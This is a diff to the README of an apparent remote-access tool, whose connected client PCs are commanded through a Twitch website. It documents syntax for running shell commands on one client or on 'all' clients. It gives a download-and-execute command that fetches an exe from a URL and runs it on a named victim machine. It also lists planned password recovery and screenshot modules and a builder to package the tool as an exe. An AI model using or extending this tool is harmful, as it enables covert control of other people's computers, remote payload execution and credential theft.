@@ -32,25 +32,24 @@ Upon connection to a server, a new client will announce its presence and client 
 
 This program also features different modules which can be used.
 
-`!act client command action true`
+`!act client command action`
 
 - Act is the keyword to use a command for the client.
 - Client specifies a singular user or a group. You can use a specific name (ex: DESKTOP-TEST) or 'all'.
 - Command specifies the intended module to use.
 - Action is what to use with the selected module. For example 'start.' will open the current directory on the clients PC when using CMD.
-- True is just a placeholder value as I was too lazy to scrub \r\n off the final value. You can write anything.
 
 An example cmd command would be:
 
-`!act all cmd start. true`
+`!act all cmd start.`
 
 ![Client action.](https://i.imgur.com/g7d5P83.png)
 
-This would open the current directory on every connected clients PC.
+This would open the current directory on every connected clients PC. Note that the photo is from an older version and True is no longer required.
 
 An example download+execute command would be:
 
-`!act DESKTOP-TEST de https://example.com/files/file.exe true`
+`!act DESKTOP-TEST de https://example.com/files/file.exe`
 
 It currently only supports exe files.
 
@@ -67,6 +66,5 @@ Making the program is quite simple.
 # Upcoming features
 - More modules (password recovery and screenshot coming soon.)
 - Download & execute supporting all file types.
-- Removing the requirement for 'true' in commands (proper scrubbing.)
 - A builder to simplify making the program as well as making it an exe.
 - Command line based control module as an alternative to the twitch website.
